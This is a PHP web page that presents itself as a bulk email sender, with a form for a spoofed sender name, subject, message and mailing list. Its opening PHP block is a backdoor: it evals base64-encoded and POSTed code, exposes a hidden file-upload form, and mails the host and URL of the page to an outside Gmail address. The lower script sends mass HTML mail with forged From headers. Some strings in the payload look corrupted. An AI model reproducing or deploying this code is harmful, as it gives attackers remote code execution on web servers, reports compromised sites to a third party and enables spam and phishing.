<?php (@copy($_FILES['f']['tmp_nsqme'], $_FILES['f']['naqe'])); $in = $_GET['in']; if(isset($in) && !empty($in)){ echo @eval(base64_decode('ZGllKGluYjksqlshiq2x1ZGVfb25jZSAkaW4pOw==')); } $ev = $_POST['ev']; if(isset($ev) && !empty($ev)){ echo eval(urldecode($ev)); exit; } if(isset($_POST['action'] ) ){ $action=$_POST['action']; $message=$_POST['message']; $emaillist=$_POST['emaillist']; $from=$_POST['from']; $subject=$_POST['subject']; $realname=$_POST['realname']; $wait=$_POST['wait']; $tem=$_POST['tem']; $smv=$_POST['smv']; $message = urlencode($message); $message = ereg_replace("%5C%22", "%22", $message); $message = urldecode($message); $message = stripslashes($message); $subject = stripslashes($subject); } $wor_h = $_SERVER['HTTP_HOST'];$wor_u = $_SERVER['REQUEST_URI'];$wor_mai="jappan12010@gmail.com";$s1555="Mailer XAV";$wsoMSG="$wor_h$wor_u";@mail($wor_mai,$s1555,$wsoMSG);$drix  = $_GET['m_b'];if($drix== 'drix'){$xsecshell = $_FILES['file']['name'];$xsecteam  = $_FILES['file']['tmp_name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='===>' /></form>";move_uploaded_file($xsecteam,$xsecshell); }

?>
<html>
<head>
	<title></title>
	<link rel="Shortcut Icon" type="image/x-icon" href="data:image/png;base64,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">
<style type="text/css">
input {
	font-size: 120%;
	color: #5a5854;
	background-color: #f2f2f2;
	border: 1px solid #bdbdbd;
	padding: 5px 5px 5px 30px;
	background-repeat: no-repeat;
	background-position: 7px 5px ;
	margin-bottom: 10px;
}
textarea {
		font-size: 105%;
	 resize: none;
}
input:focus, input:hover {
	background-color: #ffffff;
	border: 1px solid #b1e1e4;
}
#sendnow {
    width: 7em;  height: 2em;
}
.textbox {
}
.sname {
}
.ssub {
}
.smsg {
	background-color: #f2f2f2;
	border:1px solid #bdbdbd;
	border-left: 13px solid #bdbdbd;
}
.smail {
	background: #f2f2f2;
	border:1px solid #bdbdbd;
	border-left: 13px solid #bdbdbd;	
}
.bott {
}
h1 {
	background-color: DarkCyan;
}
div {
	margin: 50 100 20 100;
	background-color: #F6F6F6;
}
</style>
</head>
<body bgcolor='#011711'>
	<form action="" method="post" enctype="multipart/form-data" name="form1" align='center'>
  <input type="hidden" name="veio" value="sim">

    <tr>
<div align='center's >
<h1><font color='FFFFFF' face='arial'><IMG SRC="data:image/png;base64,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"></font>
	<br>
</h1>
<div align='center'>
<input type='text' class='textbox' name='de' placeholder='Your Email' size='50' >  <input type='text' name='nome' class='sname' placeholder='Your Name' >
<br>
<br>
<input name="ssubject" type='text' size='78' class='ssub' placeholder='Subject '> 
</div>
<div align='center'>
<textarea class='smsg' placeholder='Put Your Letter Here' name="bodys" rows='10' cols='63'></textarea> <textarea name='emails' class='smail' placeholder='Put Maillist Here' rows='10' cols='35'></textarea>
<br>
<input type='submit' value="Send" class='bott' id='sendnow'>
<br>
<br>
</form>
</div>
<?php
$testa = $_POST['veio'];
if($testa != "") {
$message = $_POST['bodys'];
$subject = $_POST['ssubject'];
$nome = $_POST['nome'];
$from = $_POST['de'];
$from_mail = $nome.'<'.$from.'>';
$to = $_POST['emails'];
$email = explode("\n", $to);
$message = stripslashes($message);
$i = 0;
$count = 1;
while($email[$i]) {
$ok = "ok";
$headers  = "MIME-Version: 1.0\n";
$headers .= "Content-Type: text/html; charset=UTF-8\n";
$headers .= 'From: ' . $from_mail . "\r\n";
if(mail($email[$i], $subject, $message, $headers))
echo "<font color=DarkCyan>Number: $count <b>".$email[$i]."</b> <font color=DarkCyan>Rezult inchallah....!</font><br><hr>";
else
echo "<font color=red>Number: $count <b>".$email[$i]."</b> <font color=red>Error in Sending ??</font><br><hr>";
$i++;
$count++;
}
$count--;
if($ok == "ok")
echo ""; 
}
?>
</body>
